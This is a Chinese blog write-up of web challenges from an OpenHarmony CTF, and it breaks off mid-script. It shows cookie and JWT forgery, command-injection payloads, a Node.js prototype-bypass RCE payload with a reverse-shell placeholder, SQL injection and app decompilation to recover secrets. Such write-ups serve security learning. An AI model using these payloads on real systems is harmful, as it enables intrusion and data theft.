<!DOCTYPE html>
<html lang="en">
  <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>第一届OpenHarmony CTF专题赛 Web Writeup - p0l1st&#39;s blog</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="第一届OpenHarmony CTF专题赛 Web Writeup - p0l1st&#39;s blog" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://example.com/2025/06/06/%E7%AC%AC%E4%B8%80%E5%B1%8AOpenHarmony-CTF%E4%B8%93%E9%A2%98%E8%B5%9B-Web-Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2025-06-06T08:33:50.000Z" />
  
  <meta property="og:article:author" content="p0l1st" />
  
  

  
  
<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">

  
  
  
<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">

  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
  
  
<link rel="stylesheet" href="/css/components/card.css">

  
  
  
  
<link rel="stylesheet" href="/css/components/button.css">

  
  
  
  
<link rel="stylesheet" href="/css/components/badge.css">

  
  
  
  
<link rel="stylesheet" href="/css/components/utilities.css">

  
  
  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  
  
  
<link rel="stylesheet" href="/css/scroll-reveal.css">

  
  
  
<link rel="stylesheet" href="/css/view-transition.css">

  
  
  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
  
<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">

  
<script src="/js/smooth-scroll.js"></script>

  

  

  <script>var ThemeCupertino = {}</script>
  
<meta name="generator" content="Hexo 6.3.0"></head>

  <body
    data-color-scheme="auto"
    data-uppercase-categories="true"
    
    data-rainbow-banner="true"
    data-rainbow-banner-shown="always"
    data-rainbow-banner-month="6"
    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
    
    data-config-root="/"
    
    data-toc="true"
    data-toc-max-depth="2"
    
    
    
    data-scroll-reveal-disappear="false"
    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
    
  >
    <a href="#main-content" id="skip-to-content">Skip to content</a>
    <nav id="theme-nav">
  <div class="inner">
    <a class="title" href="/">Blog</a>
    <div class="nav-arrow"></div>
    <div class="nav-items">
      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>

      
      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
      
      <a class="nav-item" href="/friends" style="--index: 2">Friends</a>
      
      <a class="nav-item" href="/about" style="--index: 3">About</a>
      
      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/p0l1st" style="--index: 4"><i class="si si-github"></i></a>
      
      <a class="nav-item is-icon" href="/search" style="--index: 5"><i class="bi bi-search"></i></a>
      
    </div>
  </div>
</nav>

    <main id="main-content">
      
<article class="post">
  <div class="meta">
    

    
    <time class="date" datetime="2025-06-06T16:33:50+08:00">
      June 6, 2025
    </time>
    

    <h1 class="title">第一届OpenHarmony CTF专题赛 Web Writeup</h1>
  </div>

  <div class="content">
    <h1 id="Layers-of-Compromise"><a href="#Layers-of-Compromise" class="headerlink" title="Layers of Compromise"></a>Layers of Compromise</h1><p>弱口令user password123登录</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021635157.png" alt="img"></p>
<p>cookie中role的值改为admin即可查看文档</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021635201.png" alt="img"></p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021635148.png" alt="img"></p>
<p>提示查看&#x2F;data&#x2F;app&#x2F;www&#x2F;secrettttts获取开发令牌，尝试访问secrettttts&#x2F;token.txt</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021635165.png" alt="img"></p>
<p>这里有auth_token的生成逻辑，写个脚本生成一下auth_token，cookie带上auth_token就能访问logs.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$auth_key</span> = <span class="string">&#x27;S3cr3tK3y!2023&#x27;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&#x27;dev&#x27;</span>;</span><br><span class="line"><span class="variable">$hash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$username</span> . <span class="variable">$auth_key</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = [</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span> =&gt; <span class="variable">$username</span>,</span><br><span class="line">    <span class="string">&#x27;hash&#x27;</span> =&gt; <span class="variable">$hash</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$cookie</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;auth_token=&quot;</span> . <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021635169.png" alt="img"></p>
<p>存在命令注入，拼接一下就行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=filter_logs&amp;filter=<span class="string">&quot;;ls$&#123;IFS&#125;/data&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021635179.png" alt="img"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=filter_logs&amp;filter=<span class="string">&quot;;nl$&#123;IFS&#125;/data/f*/f*&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021636004.png" alt="img"></p>
<h1 id="Filesystem"><a href="#Filesystem" class="headerlink" title="Filesystem"></a>Filesystem</h1><p>app.controller</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Post</span>(<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line"><span class="meta">@UseInterceptors</span>(<span class="title class_">FileInterceptor</span>(<span class="string">&#x27;file&#x27;</span>))</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">doUpload</span>(<span class="params"><span class="meta">@UploadedFile</span>() <span class="attr">file</span>: <span class="title class_">Express</span>.<span class="title class_">Multer</span>.<span class="title class_">File</span></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> targetPath = path.<span class="title function_">join</span>(uploadPath, file.<span class="property">originalname</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(targetPath)</span><br><span class="line">  <span class="keyword">if</span>(file.<span class="property">originalname</span>.<span class="title function_">endsWith</span>(<span class="string">&quot;.zip&quot;</span>) || file.<span class="property">originalname</span>.<span class="title function_">endsWith</span>(<span class="string">&quot;.tar&quot;</span>))&#123;</span><br><span class="line">    fs.<span class="title function_">renameSync</span>(file.<span class="property">path</span>, targetPath);</span><br><span class="line">    <span class="keyword">var</span> result :<span class="built_in">string</span></span><br><span class="line">    result = <span class="keyword">await</span>  filehelper.<span class="title function_">extractArc</span>(targetPath)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">message</span>: <span class="string">&#x27;文件上传解压成功成功！文件夹为：&#x27;</span>, <span class="attr">path</span>: path.<span class="title function_">basename</span>(result) &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    fs.<span class="title function_">renameSync</span>(file.<span class="property">path</span>, targetPath);</span><br><span class="line">    <span class="keyword">return</span> &#123; <span class="attr">message</span>: <span class="string">&#x27;文件上传成功！&#x27;</span>, <span class="attr">path</span>: file.<span class="property">originalname</span> &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Get</span>(<span class="string">&#x27;download&#x27;</span>)</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">downloadFile</span>(<span class="params"><span class="meta">@Query</span>(<span class="string">&#x27;filename&#x27;</span>) <span class="attr">filename</span>: <span class="built_in">string</span>, <span class="meta">@Response</span>() res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(filename.<span class="title function_">includes</span>(<span class="string">&quot;./&quot;</span>)) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotFoundException</span>(<span class="string">&#x27;路径不合法&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> filePath = path.<span class="title function_">join</span>(<span class="string">&#x27;/opt/uploads&#x27;</span>, filename);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(filePath)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotFoundException</span>(<span class="string">&#x27;文件未找到&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">download</span>(filePath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&#x27;下载失败&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以软链接</p>
<p>读&#x2F;<strong>data&#x2F;opt&#x2F;filesystem&#x2F;adminconfig.lock找到password</strong></p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021637974.png" alt="img"></p>
<p> gray-matter组件可以解析js(—js)，<a target="_blank" rel="noopener" href="https://github.com/jonschlinkert/gray-matter/issues/131%EF%BC%9A">https://github.com/jonschlinkert/gray-matter/issues/131：</a></p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021637049.png" alt="img"></p>
<p>所以可以通过&#x2F;admin&#x2F;changePassword接口处去修改slogo参数的值进行rce：</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021637996.png" alt="img"></p>
<p>这里对payload设置了长度限制，但是可以通过<code>__proto__</code>绕过，具体原因可以看下面的issue，:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/typestack/class-validator/issues/438">https://github.com/typestack/class-validator/issues/438</a></p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021637980.png" alt="img"></p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021637084.png" alt="img"></p>
<p>最终payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">获取token：</span><br><span class="line">POST /admin/login HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;username&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;hArd_Pa@s5_wd&quot;&#125;</span><br><span class="line"></span><br><span class="line">rce:</span><br><span class="line">POST /admin/changePassword HTTP/1.1</span><br><span class="line">token: xxxxxxxx</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;password&quot;: &quot;hArd_Pa@s5_wd&quot;,&quot;__proto__&quot;: &#123;&#125;,&quot;slogon&quot;:&quot;---js\nglobal.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;反弹shell&#x27;)\n---&quot;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="ezAPP-And-SERVER"><a href="#ezAPP-And-SERVER" class="headerlink" title="ezAPP_And_SERVER"></a>ezAPP_And_SERVER</h1><p><a target="_blank" rel="noopener" href="https://github.com/ohos-decompiler/abc-decompiler%E5%8F%8D%E7%BC%96%E8%AF%91modules.abc">https://github.com/ohos-decompiler/abc-decompiler反编译modules.abc</a></p>
<p>p001entry&#x2F;src&#x2F;main&#x2F;ets&#x2F;common&#x2F;Utils&#x2F;utils</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public Object <span class="comment">#~@0&lt;#oo0Oo0(..., String arg0) &#123;</span></span><br><span class="line">  <span class="keyword">from</span> = Array.<span class="keyword">from</span>(arg0);</span><br><span class="line">  _lexenv_0_0_ = Array.<span class="keyword">from</span>(<span class="string">&quot;134522123&quot;</span>);</span><br><span class="line">  <span class="built_in">map</span> = <span class="keyword">from</span>.<span class="built_in">map</span>(<span class="comment">#~@0&lt;@1*#);</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">map</span>.join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据这个逻辑对全部加密过的内容进行解密</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hmtest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY</span> <span class="operator">=</span> <span class="string">&quot;134522123&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decrypt</span><span class="params">(String encrypted)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] keyChars = KEY.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] encryptedChars = encrypted.toCharArray();</span><br><span class="line">        <span class="type">char</span>[] decryptedChars = <span class="keyword">new</span> <span class="title class_">char</span>[encryptedChars.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; encryptedChars.length; i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">keyChar</span> <span class="operator">=</span> keyChars[i % keyChars.length];</span><br><span class="line">            decryptedChars[i] = (<span class="type">char</span>) (encryptedChars[i] ^ keyChar);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decryptedChars);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 解密 this.Secret</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">secret</span> <span class="operator">=</span> <span class="string">&quot;FpBz\u0001ecH\n\u001bEzx\u0017@|SrAXQGkloXz\u0007ElXZ&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;Decrypted Secret: &quot;</span> + decrypt(secret));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解密代码中出现的其他加密字符串</span></span><br><span class="line">        String[] encryptedStrings = &#123;</span><br><span class="line">                <span class="string">&quot;\u001eRD\\\u001dD\u0000\u001dTTGRYSU&quot;</span>,      <span class="comment">// #~@0&lt;#l1Lll1</span></span><br><span class="line">                <span class="string">&quot;|z&#125;w&#123;Xp|qVXE]Y[v\u000bD\u0001qudwtps|rre\rs\u007fx&#123;qrT\u007fvscts\u0005ykF\u0004~a~J\u0001@\n\u0003YaD\u0001B\u0004K9\\DFUH\u001dyFDc[Fw\u0006\u0001guxsxaJ\u0007h\u0006]aGqGd[p[Dtd|\u0002\u0007\u0001dXYG&#125;RPsAB~\u0005K@F|ZFYtW|\u007f?A\u0006~aG\u0006cN&#125;dKV^XVDl\u0002j\u0002\u0005Cukxzzkkua\u0005d^\u001fRhP\u0004jkFZe\ruQwCUtYV~P~[DVVfc@@8y\u0006@G\u0000&#123;Ea&#123;&#123;&#125;ZeX\\xhCrYU~gaM~t\u0000\u0019^Fup\u007fdF\u0004q|`q\u001bS@tAA\u001cd\u0006\u001fzAB[\u007ftpeSz`P_8\n\bfAL\u000bykAt`Dl\u0007W\u0019\u007fDExr@y|Sf\u0003_HPd\u0005jf`[k_[Y\u001eY\u0003\u001aU\u000b|tg\u0005\u0003fAgiEDAw@vdsD;x\u001b\\|PrubUxe\u0002\u0005x\u001eVv~\u0000mrkzzww\u0003d\u007fXsBuur\u0001_zb]G\u0006\u0004\u000bu\u0003PvzJ~EfdDs|cE\u001eqp\u0000@&gt;aE&#123;usbpq&quot;</span>, <span class="comment">// #~@0&lt;#l1Lll1</span></span><br><span class="line">                <span class="string">&quot;J\u0011UVF[^\\\u0011\u000b\u0011SPFT]ST\u0013N&quot;</span>, <span class="comment">// #~@0&lt;#l1Lll1</span></span><br><span class="line">                <span class="string">&quot;\u001eRD\\\u001dD\u0000\u001dP^]@TQFB\rFXW\t&quot;</span>  <span class="comment">// #~@0&lt;#o0O0OOoo</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String str : encryptedStrings) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Decrypted: &quot;</span> + decrypt(str));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解密其他在代码中出现的混淆字符串</span></span><br><span class="line">        String[] additionalStrings = &#123;</span><br><span class="line">                <span class="string">&quot;c`u\u0007\u0002\u0006\t&quot;</span>,          <span class="comment">// #~@0&lt;@2*#</span></span><br><span class="line">                <span class="string">&quot;c`u\u0007\u0002\u0006\tNczpg\u0004&quot;</span>, <span class="comment">// #~@0&lt;#RrrrRRR</span></span><br><span class="line">                <span class="string">&quot;W_UR&quot;</span>                              <span class="comment">// #~@0&lt;@4**#</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (String str : additionalStrings) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Decrypted: &quot;</span> + decrypt(str));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Decrypted Secret: wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh</span><br><span class="line">Decrypted: /api/v1/getflag</span><br><span class="line">Decrypted: MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6HXr1LSOx2q97lSv0p7z</span><br><span class="line">hqtgy/JwwWntE73TDKGMSx6Z5lRsDuVjBhuGPI050VkhtIgbAppM4xtsNhwkGfOK</span><br><span class="line">s4OSt7PzHVyglkgwX7X04qFZKNOYYDS6Um+gZb5XXwiQ8GcFqfEjbKbLjvegUWur</span><br><span class="line">H4sv3OpSIJOiTkhMZqCkfOTUxLF1+mwFDJVt5COQB/frFps/U5+OspjMGAVgORbn</span><br><span class="line">99Uuy9KZsGQwX2e+NvvIAtLNaW1lycP0XTQiXnhm+k1+g8MGS01TpUZtwuBrDUAw</span><br><span class="line">K/iNbCGQdKQ77J/dEO3YGYHKED2WKmApDGA0lNWou768D0dCHxOwUUwGIQw/CC1s</span><br><span class="line">TwIDAQAB</span><br><span class="line">Decrypted: &#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;getflag&quot;</span>&#125;</span><br><span class="line">Decrypted: /api/v1/contacts?uid=</span><br><span class="line">Decrypted: RSA2048</span><br><span class="line">Decrypted: RSA2048|PKCS1</span><br><span class="line">Decrypted: flag</span><br></pre></td></tr></table></figure>

<p>#~@0&lt;@4*#这里发现请求&#x2F;api&#x2F;v1&#x2F;getflag的时候需要带上Authorization和X-Sign</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">Object</span> #~@<span class="number">0</span>&lt;@<span class="number">4</span>*#(<span class="title class_">Object</span> functionObject, <span class="title class_">Object</span> newTarget, utils <span class="variable language_">this</span>, <span class="title class_">Object</span> arg0) &#123;</span><br><span class="line"></span><br><span class="line">    i = <span class="string">&quot;&#123;\&quot;data\&quot;:\&quot;&quot;</span> + arg0 + <span class="string">&quot;\&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    ldlexvar = _lexenv_0_0_;</span><br><span class="line"></span><br><span class="line">    obj = ldlexvar.<span class="property">request</span>;</span><br><span class="line"></span><br><span class="line">    ldlexvar2 = _lexenv_0_1_;</span><br><span class="line"></span><br><span class="line">    obj2 = <span class="title function_">createobjectwithbuffer</span>([<span class="string">&quot;method&quot;</span>, <span class="number">0</span>, <span class="string">&quot;extraData&quot;</span>, <span class="number">0</span>, <span class="string">&quot;header&quot;</span>, <span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    obj2.<span class="property">method</span> = <span class="keyword">import</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> http &#125; <span class="keyword">from</span> <span class="string">&quot;@ohos:net.http&quot;</span>.<span class="property">RequestMethod</span>.<span class="property">POST</span>;</span><br><span class="line"></span><br><span class="line">    obj2.<span class="property">extraData</span> = i;</span><br><span class="line"></span><br><span class="line">    obj3 = <span class="title function_">createobjectwithbuffer</span>([<span class="string">&quot;Authorization&quot;</span>, <span class="number">0</span>, <span class="string">&quot;X-Sign&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/ apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    ldlexvar3 = _lexenv_1_0_;</span><br><span class="line"></span><br><span class="line">    obj4 = ldlexvar3.<span class="property">o0OO00O</span>;</span><br><span class="line"></span><br><span class="line">    ldlexvar4 = _lexenv_0_2_;</span><br><span class="line"></span><br><span class="line">    ldlexvar5 = _lexenv_1_0_;</span><br><span class="line"></span><br><span class="line">    obj3.<span class="property">Authorization</span> = <span class="title function_">obj4</span>(ldlexvar4, ldlexvar5.<span class="title function_">oo0Oo0</span>(_lexenv_1_0_.<span class="property">Secret</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title class_">CryptoJS</span> = <span class="keyword">import</span> &#123; <span class="keyword">default</span> <span class="keyword">as</span> <span class="title class_">CryptoJS</span> &#125; <span class="keyword">from</span> <span class="string">&quot;@normalized:N&amp;&amp;&amp;@ohos/crypto-js/index&amp;2.0.0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">MD5</span> = <span class="title class_">CryptoJS</span>.<span class="title class_">MD5</span>(i);</span><br><span class="line"></span><br><span class="line">    obj3.<span class="property">X</span>-<span class="title class_">Sign</span> = <span class="title class_">MD5</span>.<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">    obj2.<span class="property">header</span> = obj3;</span><br><span class="line"></span><br><span class="line">    callthisN = <span class="title function_">obj</span>(ldlexvar2, obj2);</span><br><span class="line"></span><br><span class="line">    callthisN.<span class="title function_">then</span>(#~@<span class="number">0</span>&lt;@<span class="number">4</span>**#);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>JWT的key就是wCvO3WRz9*vNM%rMaApkerY^^jI6vXmh，可以直接伪造</p>
<p>admin的uid ，访问&#x2F;api&#x2F;v1&#x2F;contacts?uid&#x3D;1” or 1&#x3D;1– 获得</p>
<p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202603021639210.png" alt="img"></p>
<p>最后得算X-Sign，需要用上面解出的RSA公钥加密，data的值是是{“action”:”getflag”}</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">CryptoJS</span> = <span class="built_in">require</span>(<span class="string">&#x27;crypto-js&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = 